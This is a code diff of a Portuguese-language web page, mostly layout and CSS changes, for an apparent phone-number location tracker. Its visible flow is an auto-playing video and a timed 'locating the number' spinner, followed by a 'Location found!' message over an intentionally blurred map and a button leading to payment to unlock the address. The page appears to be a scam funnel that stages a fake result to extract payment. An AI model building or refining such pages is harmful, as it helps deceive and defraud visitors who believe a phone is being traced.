@@ -52,12 +52,34 @@
             70% { box-shadow: 0 0 10px 10px rgba(37, 211, 102, 0); }
             100% { box-shadow: 0 0 0 0 rgba(37, 211, 102, 0); }
         }
-        h2, h3 {
-            margin-top: 10px;
+        h2, h3, p {
+            text-align: center;
         }
         .hidden { display: none; }
+        .video-responsive {
+            position: relative;
+            padding-bottom: 56.25%;
+            height: 0;
+            overflow: hidden;
+            max-width: 100%;
+            margin: 0 auto 20px auto;
+        }
+        .video-responsive iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+        .result img {
+            display: block;
+            margin: 15px auto;
+        }
+        .result p, .result h2 {
+            text-align: center;
+        }
     </style>
-    
     <!-- Clarity -->
     <script type="text/javascript">
     (function(c,l,a,r,i,t,y){
@@ -65,7 +87,7 @@
         t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
         y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
     })(window, document, "clarity", "script", "s355u53m2d");
-</script>
+    </script>
 </head>
 <body>
 
@@ -77,10 +99,10 @@
 
 <!-- Fase 2: Vídeo -->
 <div id="videoPhase" class="hidden">
-    <div id="videoContainer" style="width:100%; max-width:600px; height:315px; margin:auto;"></div>
+    <div id="videoContainer" class="video-responsive"></div>
 </div>
 
-<!-- Fase 2.1: Loading (título + spinner + texto de aguarde) -->
+<!-- Fase 2.1: Loading -->
 <div id="loadingTexts" class="hidden">
     <h2 id="loading-title">🔎 Estamos localizando o número informado...</h2>
     <div id="spinner" class="spinner"></div>
@@ -91,7 +113,7 @@
 <div class="result hidden" id="result">
     <h2>✅ Localização Encontrada!</h2>
     <p>Para desbloquear e ver o endereço exato, clique no botão abaixo:</p>
-    <img src="static/images/mapa_blur.png" alt="Mapa Localização" style="width:100%; max-width:350px; filter:blur(2px); border-radius:10px; margin-top:15px;">
+    <img src="static/images/mapa_blur.png" alt="Mapa Localização" style="width:100%; max-width:350px; filter:blur(2px); border-radius:10px;">
     <a href="#pagamento" class="unlock-button">🔓 Desbloquear Agora!</a>
 </div>
 
@@ -104,8 +126,7 @@ function startTracking() {
     document.getElementById('videoContainer').innerHTML = `
         <iframe src="https://streamable.com/e/htq2jt?autoplay=1" 
                 allow="autoplay; fullscreen" 
-                frameborder="0"
-                style="width:100%; height:100%; border:none;"></iframe>
+                frameborder="0"></iframe>
     `;
 
     setTimeout(function() {
